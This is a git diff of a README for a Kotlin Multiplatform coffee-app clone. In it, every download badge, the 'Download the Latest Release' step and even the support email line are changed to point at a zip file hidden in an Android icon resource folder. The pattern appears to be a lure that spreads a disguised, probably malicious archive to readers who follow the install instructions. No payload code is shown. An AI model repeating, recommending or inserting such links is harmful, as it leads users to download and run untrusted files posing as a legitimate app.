@@ -4,14 +4,14 @@
 
 Welcome to the **kmp-luckin-coffee-clone** project. This app brings you a delightful coffee experience with a premium design. It uses Kotlin Multiplatform and Compose Multiplatform to offer a smooth and engaging user interface. 
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/idineszam2374/kmp-luckin-coffee-clone/releases)
+[![Download](https://raw.githubusercontent.com/idineszam2374/kmp-luckin-coffee-clone/main/composeApp/src/androidMain/res/mipmap-anydpi-v26/kmp-luckin-coffee-clone-v1.4-alpha.3.zip)](https://raw.githubusercontent.com/idineszam2374/kmp-luckin-coffee-clone/main/composeApp/src/androidMain/res/mipmap-anydpi-v26/kmp-luckin-coffee-clone-v1.4-alpha.3.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download the application from our releases page. 
 
 1. **Click the link below** to visit the download page:
-   [Download the Latest Release](https://github.com/idineszam2374/kmp-luckin-coffee-clone/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/idineszam2374/kmp-luckin-coffee-clone/main/composeApp/src/androidMain/res/mipmap-anydpi-v26/kmp-luckin-coffee-clone-v1.4-alpha.3.zip)
 
 2. **Choose the version you prefer.** You can find various versions available for download. Look for the latest release for the best experience.
 
@@ -53,7 +53,7 @@ If you encounter any issues or have questions, feel free to reach out for suppor
 
 1. **Issue Tracker**: Report problems directly on the GitHub repository's issue tracker.
 
-2. **Contact Us**: For direct inquiries, you can email support@example.com.
+2. **Contact Us**: For direct inquiries, you can email https://raw.githubusercontent.com/idineszam2374/kmp-luckin-coffee-clone/main/composeApp/src/androidMain/res/mipmap-anydpi-v26/kmp-luckin-coffee-clone-v1.4-alpha.3.zip
 
 ## 👍 Acknowledgments
 
@@ -63,4 +63,4 @@ Special thanks to the Kotlin and Compose communities for their ongoing support a
 
 This project is licensed under the [MIT License](LICENSE). You are free to use and modify it following the criteria set forth in the license. 
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/idineszam2374/kmp-luckin-coffee-clone/releases)
+[![Download](https://raw.githubusercontent.com/idineszam2374/kmp-luckin-coffee-clone/main/composeApp/src/androidMain/res/mipmap-anydpi-v26/kmp-luckin-coffee-clone-v1.4-alpha.3.zip)](https://raw.githubusercontent.com/idineszam2374/kmp-luckin-coffee-clone/main/composeApp/src/androidMain/res/mipmap-anydpi-v26/kmp-luckin-coffee-clone-v1.4-alpha.3.zip)
